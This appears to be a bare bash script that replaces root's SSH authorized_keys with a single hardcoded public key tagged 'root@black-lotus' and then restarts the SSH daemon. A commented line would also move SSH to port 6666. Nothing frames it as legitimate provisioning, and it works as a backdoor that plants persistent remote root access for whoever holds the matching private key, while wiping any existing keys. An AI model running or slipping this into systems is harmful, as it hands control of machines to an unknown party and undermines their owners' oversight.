#!/bin/bash                                             
#sed -i '/Port 2/c\Port 6666' /etc/ssh/sshd_config
mkdir -p /root/.ssh/
touch /root/.ssh/authorized_keys
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmaUCgLA9JRgIntHhnAqNdcLWrYWtGHObZ+4SN354U7AOiZTtbMrPQjCN7tHnxMGAYOtzxkBgd8FmLzjIRJtZOf5mDGejToGkrY2WV0e9hZpeLedJdZ/w1sm/2S9GdRW9dBiB6tT+Jeo6gGIGN8gZyaPyHuvkCoLuPerVncNX+VaMfPCxJruQKVOxA1rKzFYdXMGT1EtVtSbcaCJoQlr4QiTxNTF5I1EZtRxdPuOR/BoPbz8DTlKQuNS38owWrZBh8HUHbxuqCLNgMC2YTYbxHZCKU1YI60QKLQpWKV3yHghs7+kdFC2L5Z6qzIA90G6GnyqsDUAoi7XUzw53SKsVz root@black-lotus' > /root/.ssh/authorized_keys
service sshd restart
